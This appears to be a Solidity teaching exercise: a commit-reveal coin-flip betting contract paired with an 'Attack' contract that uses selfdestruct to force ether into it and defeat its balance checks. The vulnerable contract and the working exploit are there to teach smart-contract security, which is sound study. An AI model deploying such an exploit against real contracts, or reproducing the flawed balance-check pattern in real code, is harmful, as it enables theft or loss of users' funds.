//*** Exercice 10 ***//
// You choose Head or Tail and send 1 ETH.
// The next party send 1 ETH and try to guess what you chose.
// If it succeed it gets 2 ETH, else you get 2 ETH.
contract HeadTail {
    address public partyA;
    address public partyB;
    bytes32 public commitmentA;
    bool public chooseHeadB;
    uint public timeB;



    /** @dev Constructor, commit head or tail.
     *  @param _commitmentA is keccak256(chooseHead,randomNumber);
     */
    function HeadTail(bytes32 _commitmentA) payable {
        require(msg.value == 1 ether);

        commitmentA=_commitmentA;
        partyA=msg.sender;
    }

    /** @dev Guess the choice of party A.
     *  @param _chooseHead True if the guess is head, false otherwize.
     */
    function guess(bool _chooseHead) payable {
        require(msg.value == 1 ether);
        require(partyB==address(0));

        chooseHeadB=_chooseHead;
        timeB=now;
        partyB=msg.sender;
    }

    /** @dev Reveal the commited value and send ETH to the winner.
     *  @param _chooseHead True if head was chosen.
     *  @param _randomNumber The random number chosen to obfuscate the commitment.
     */
    function resolve(bool _chooseHead, uint _randomNumber) {
        require(msg.sender == partyA);
        require(keccak256(_chooseHead, _randomNumber) == commitmentA);
        require(this.balance >= 2 ether);

        if (_chooseHead == chooseHeadB)
            partyB.transfer(2 ether);
        else
            partyA.transfer(2 ether);
    }

    /** @dev Time out party A if it takes more than 1 day to reveal.
     *  Send ETH to party B.
     * */
    function timeOut() {
        require(now > timeB + 1 days);
        require(this.balance>=2 ether);
        partyB.transfer(2 ether);
    }
}

contract Attack {
    HeadTail public headTail;
    function Attack (address _address) {
    headTail = HeadTail(_address);
    }

    function getBalanceContract() public view returns(uint){
        return address(headTail).balance;
    }

    //After the HeadTail contract deployment we can use selfdestruct
    function selfdes()public payable{
        selfdestruct(address(headTail));
    }
}
